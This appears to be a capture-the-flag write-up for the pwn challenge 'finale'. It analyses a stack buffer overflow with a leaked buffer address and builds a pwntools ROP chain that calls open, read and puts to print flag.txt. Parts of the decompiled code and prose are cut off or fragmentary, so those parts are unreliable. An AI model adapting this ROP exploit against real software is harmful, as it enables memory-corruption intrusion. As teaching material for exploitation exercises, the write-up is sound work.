We can see that if we provide the secret phrase s34s0nf1n4l3b00 , we go into the finale
function.

finale()
ssize_t finale()
{
char buf[64]; // [rsp+0h] [rbp-40h] BYREF
printf("\n[Strange man in mask]: Season finale is here! Take this souvenir
with you for good luck: [%p]", buf);
printf("\n\n[Strange man in mask]: Now, tell us a wish for next year: ");

Spooktober Spirit be with you!\n\n", 0x54uLL);
}

It prints out the address of buf , then reads 0x1000 bytes into the 64-byte buffer buf .

Vulnerabilities
In the finale() function, we can see a bug and a leak:
It leaks the address of buf , which is the buffer we write into and it's placed on the stack
There is an obvious buffer overflow, because buf is 64 bytes long and the read call reads up
to 0x1000 bytes
Our initial thought is to leak a libc address via the ret2plt technique and follow it up with a ret2libc
attack. However, we can read the provided README.txt :
Remote server is using a custom libc, trying to find the right libc is not
intended. We suggest you avoid using techniques based on libc for this
challenge.

Apparently, the challenge remotely is linked with a custom libc. This makes a ret2libc approach
impossible as we cannot calculate the exact offsets (without leaking the remote libc itself).

Exploitation
As we cannot do a simple ret2plt, we will instead call open and read to read flag.txt and then
puts to print out the flag!

Parsing the Buffer Leak
We will first do a simple parsing of the buffer leak that is given to us:

from pwn import *
elf = context.binary = ELF('./finale', checksec=False)

# get buffer leak

Opening flag.txt
Now we have to ROP to call open() on flag.txt . Doing this will open another file descriptor
that we can read from, enabling us to get the flag.
In order to do this, we need a pointer to the string flag.txt . This is easy, as we have the leak of
the exact start of the buffer, so we just put flag.txt\0 as the first 9 bytes of the padding and
pass buf_leak as the parameter as that will point to our inputted flag.txt . The second
parameter will be O_RDONLY to signify that we are only reading, and that has the value 0 . Once
we read it, we will loop back to the finale() function to give us another buffer overflow for a
second ROP.
We can also observe through debugging that there is a padding of 72 bytes until the return
pointer. Combining all of this with pwntools' ROP capabilities gives us this:
# call open
rop = ROP(elf)
rop.raw(b'flag.txt\0')
rop.raw(b'A' * 63)
rop.open(buf_leak, 0)
p.sendlineafter(b'year: ', rop.chain())

Open will often give a file descriptor of 3 locally, as stdin , stdout and stderr take values 0-2.
Remotely, there may be other file descriptors taken due to forking processes (for example), so we
may have to trial and error.

Located at 0x404000 . Writing directly to it causes a SIGBUS error (likely because there is
something useful there!) but writing to 0x404020 works. Now you may be tempted to throw the
read and puts directly after the first ropchain like so:

rop.raw(b'flag.txt\0')
rop.raw(b'A' * 63)
rop.open(buf_leak, 0)
rop.read(3, 0x404020, 0x20)

# fd will be 3

rop.puts(0x404020)

However, pwntools fails to satisfy the constraints of the third parameter to read of 0x20 , which
is in RDX. If we don't set RDX as follows:
rop.read(3, 0x404020)

Then nothing gets read, because RDX is 0 at that point:

So nothing gets read. Instead, after the open() ropchain we will call finale() again and run the
read() and puts() . Without the call to open() , RDX is actually set to a large enough number:

rop.open(buf_leak, 0)
rop.finale()
pause()
p.sendlineafter(b'year: ', rop.chain())
# another rop to read and print
rop = ROP(elf)
rop.raw(b'A' * 72)
rop.read(3, 0x404020)

# Read file and print its content to stdout, fd will

always be 3; RDX is already set
rop.puts(0x404020)
p.sendlineafter(b'year: ', rop.chain())

We can then parse the flag and print it out!
p.recvuntil(b'you!\n\n')
log.success(p.recvuntil(b'}').decode())
